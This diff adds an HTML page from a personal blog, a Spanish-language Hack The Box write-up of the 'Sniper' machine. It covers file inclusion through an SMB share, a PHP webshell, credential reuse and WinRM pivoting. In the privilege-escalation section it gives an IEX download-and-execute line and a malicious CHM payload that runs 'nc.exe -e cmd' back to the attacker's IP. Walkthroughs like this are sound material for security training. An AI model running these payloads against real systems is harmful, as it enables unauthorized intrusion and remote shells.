@@ -1,0 +1,575 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB-Sniper - creep33.github.io</title>
+<meta name="description" content="WriteUp con metodología de la máquina Sniper.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="creep33.github.io">
+<meta property="og:title" content="HTB-Sniper">
+<meta property="og:url" content="http://localhost:4000/HTB-Sniper/">
+
+
+  <meta property="og:description" content="WriteUp con metodología de la máquina Sniper.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/WriteUps/Sniper.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-29T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/HTB-Sniper/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "creep33",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="creep33.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB-Sniper</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="creep33" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">creep33</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity and<br>Ethical Hacking Student
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/creep33" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB-Sniper">
+    <meta itemprop="description" content="WriteUp con metodología de la máquina Sniper.">
+    <meta itemprop="datePublished" content="December 29, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB-Sniper
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-29T00:00:00+01:00">December 29, 2021 </time>&emsp;
+          
+          
+        </p>
+        <center><img src="/assets/images/WriteUps/Sniper.png" /></center>
+
+<p>IP -&gt; 10.10.10.151</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Utilizamos <a href="/Nmap/">nmap</a> y obtenemos los siguientes resultados.</p>
+
+<p><a href="/assets/files/WriteUps/Sniper.txt">Sniper Nmap Result</a></p>
+
+<h2 id="crackmapexec">Crackmapexec</h2>
+<p>Usamos <a href="/Crackmapexec/">Crackmapexec</a> para enumerar información del <a href="/Active-Directory/">Active Directory</a> y añadimos el dominio al /etc/hosts</p>
+<blockquote>
+  <p>OS: Windows 10
+Dominio: Sniper
+Signing: False
+SMBv1: False</p>
+</blockquote>
+
+<h2 id="smbclient-y-smbhost">smbclient y smbhost</h2>
+<p>Listamos servicios mediante un [null session](/SMB/
+Pero necesitamos credenciales.</p>
+
+<h2 id="http">http</h2>
+<p>En la misma página, encontramos los directorios:</p>
+
+<blockquote>
+  <p>/blog/index.php -&gt; Podemos utilizar distintos idiomas. -&gt; Cada idioma tiene un archivo asociado. 
+/user/login.php -&gt; Panel de inicio de sesión -&gt; Probamos credenciales por defecto</p>
+</blockquote>
+
+<ul>
+  <li>Probamos un path traversal, en el parámetro lang.</li>
+</ul>
+
+<blockquote>
+  <p>Tenemos LFI</p>
+</blockquote>
+
+<ul>
+  <li>Probamos a convertirlo en un remote file inclusion.</li>
+</ul>
+
+<p>Pero no funciona</p>
+
+<ul>
+  <li>Probamos a cargar un archivo smb para tratar de crackear el hash.</li>
+</ul>
+
+<blockquote>
+  <p>Es vulnerable a RFI por <a href="/SMB/">SMB</a>. Pero no vemos ningún hash.</p>
+</blockquote>
+
+<ul>
+  <li>Tenemos que crear un recurso compartido con smbd linux.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service smbd start
+net usershare add smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="s1">''</span> <span class="s1">'Everyone:F'</span> <span class="s1">'guest_ok=y'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Creamos un archivo txt a modo de prueba</li>
+</ul>
+
+<p>Triggeamos el RFI y funciona.</p>
+
+<ul>
+  <li>Cargamos una webShell por php</li>
+</ul>
+
+<blockquote>
+  <p>webShell</p>
+</blockquote>
+
+<p>Nos enviamos una reverse shell cmd con <strong>nc.exe</strong>.</p>
+
+<h1 id="user-pivoting-chris">User Pivoting (Chris)</h1>
+
+<h2 id="os">OS</h2>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>SeImpersonatePrivilege -&gt; Podríamos utilizar [[Juicy Potato]] pero vamos a explotar la máquina de la forma intencionada.</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span><span class="nx">cd</span><span class="w"> </span><span class="nx">user</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">Chris</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>db.php -&gt; Credentials
+Chris está en el “Remote Management Users” -&gt; <a href="/winrm/">winrm</a></p>
+</blockquote>
+
+<p>Probamos las credenciales para el usuario “Chris”. Son válidas. Pero no tenemos PWNED
+El <a href="/winrm/">winrm</a> no está expuesto hacia fuera, hacemos port forwarding con <a href="/Chisel/">Chisel</a> del puerto 5985.</p>
+
+<p>Nos conectamos con [<a href="/winrm/">winrm</a> a localhost con las credenciales de “Chris”
+[ ! ] AppLockerBypass puede ser necesario.</p>
+
+<h1 id="privesc">PrivEsc</h1>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">type</span><span class="w"> </span><span class="n">C:\Users\Chris\desktop\user.txt</span><span class="w">
+</span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span><span class="nx">cd</span><span class="w"> </span><span class="nx">Docs</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span><span class="nx">type</span><span class="w"> </span><span class="nx">note.txt</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Chris</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span><span class="nx">cd</span><span class="w"> </span><span class="nx">Downloads</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>user.txt</p>
+</blockquote>
+
+<blockquote>
+  <p>note.txt -&gt; En la nota vemos que tenemos que dejar la documentación de una nueva app en la carpeta C:\Docs
+instructions.chm -&gt; Este tipo de archivos son archivos de ayuda</p>
+</blockquote>
+
+<p>Sospechamos que el tipo de archivo que tenemos que crear es un .chm
+Buscamos por “create malicious chm file”. Para crearlo necesitamos hacerlo en una máquina windows de atacante.</p>
+
+<ul>
+  <li>Descargamos HTML Help Workshop porque la herramienta lo requiere.</li>
+  <li>Utilizamos la herramienta de “nishang” <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Out-CHM.ps1</a></li>
+  <li>Nos sincronizamos al recurso y creamos el archivo malicioso.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1'</span><span class="p">)</span><span class="w">
+</span><span class="n">Out-CHM</span><span class="w"> </span><span class="s2">"C:\Users\Chris\Desktop\nc.exe -e cmd 10.10.14.13 443"</span><span class="w"> </span><span class="nt">-HHCPath</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\HTML Help Workshop"</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Movemos el archivo malicioso a la máquina víctima a la ruta C:\Docs y nos ponemos en escucha con <strong>netcat</strong>.</li>
+</ul>
+
+<blockquote>
+  <p>root.txt</p>
+</blockquote>
+
+<hr />
+
+<p>Escrito el 29-12-2021 a las 01:41 am por creep33.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">HTB</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#writeups" class="page__taxonomy-item" rel="tag">WriteUps</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-12-29T00:00:00+01:00">December 29, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/HTB-Wall/" class="pagination--pager" title="HTB-Wall
+">Previous</a>
+    
+    
+      <a href="/Apache-Tomcat/" class="pagination--pager" title="Apache Tomcat
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 creep33</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
